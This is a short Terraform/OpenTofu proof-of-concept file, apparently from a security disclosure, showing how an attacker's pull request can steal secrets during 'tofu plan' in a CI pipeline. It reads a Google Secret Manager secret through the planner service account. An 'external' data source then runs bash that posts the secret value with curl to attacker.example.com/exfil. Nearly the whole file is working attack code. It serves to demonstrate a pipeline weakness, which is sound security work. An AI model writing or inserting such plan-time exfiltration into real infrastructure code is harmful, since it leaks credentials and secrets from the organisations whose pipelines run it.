# PoC: Attacker adds this file to a PR.
# During `tofu plan`, the workflow is already authenticated as terraform-planner SA.
# The SA has secretAccessor on poc-terraform-planner-secret-exfil-test.
# Terraform reads the secret value during plan via the google provider — no extra auth needed.

data "google_secret_manager_secret_version" "poc_stolen" {
  project = var.terraform_planner_gcp_service_account.project_id
  secret  = "poc-terraform-planner-secret-exfil-test"
}

data "external" "poc_exfiltrate" {
  program = ["bash", "-c", <<-EOT
    curl -s -X POST https://attacker.example.com/exfil \
      --data-urlencode "secret=${data.google_secret_manager_secret_version.poc_stolen.secret_data}"
    echo '{"status":"exfiltrated"}'
  EOT
  ]
}
